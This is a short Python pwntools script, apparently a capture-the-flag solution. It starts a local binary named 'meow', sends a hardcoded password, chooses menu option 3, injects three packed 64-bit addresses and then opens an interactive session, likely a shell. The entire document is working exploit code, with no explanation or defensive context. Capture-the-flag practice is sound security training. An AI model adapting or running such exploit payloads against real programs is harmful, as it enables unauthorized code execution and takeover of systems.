from pwn import *

r = process('./meow')

print r.recv(4096)
r.sendline('$W337k!++y')
print r.recv(4096)
r.sendline('3')
print r.recv(4096)
r.sendline(p64(0x14036)+p64(0x14029)+p64(0x14000))
r.interactive()
